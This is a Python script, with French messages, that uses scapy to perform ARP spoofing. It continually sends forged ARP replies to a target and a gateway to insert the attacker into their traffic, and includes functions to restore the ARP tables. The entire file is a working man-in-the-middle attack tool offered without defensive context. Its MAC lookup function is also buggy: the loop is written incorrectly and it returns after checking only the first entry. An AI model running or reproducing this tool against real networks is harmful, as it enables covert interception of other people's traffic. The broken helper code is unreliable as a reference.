import scapy.all as scapy
import time
import sys


def getMac(iprecherchee,tab):
    for i in (len(tab)) :
        if tab[i]["ip"] == iprecherchee :
            return (tab[i]["mac"])
        else :
            print("l'adresse ip que vous avez choisi ne se trouve pas/plus dans le reseau")
            return()

def spoofer(targetIP, spoofIP,tab):
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=getMac(targetIP,tab),psrc=spoofIP)
    scapy.send(packet, verbose=False)

def restore(destinationIP, sourceIP,tab):
    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP,tab),psrc=sourceIP,hwsrc=getMac(sourceIP,tab))
    scapy.send(packet, count=4,verbose=False)

def startSpoof(targetIP, gatewayIP,tab):
    packets = 0
    try:
        while True:
            spoofer(targetIP,gatewayIP,tab)
            spoofer(gatewayIP,targetIP,tab)
            print("\r[+] Sent packets "+ str(packets)),
            sys.stdout.flush()
            packets +=2
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
        restore(targetIP,gatewayIP,tab)
        restore(gatewayIP,targetIP,tab)

def stopSpoof(targetIP,gatewayIP,tab):
    print('\nRestoring adresses .. ')
    restore(targetIP,gatewayIP,tab)
    restore(gatewayIP,targetIP,tab)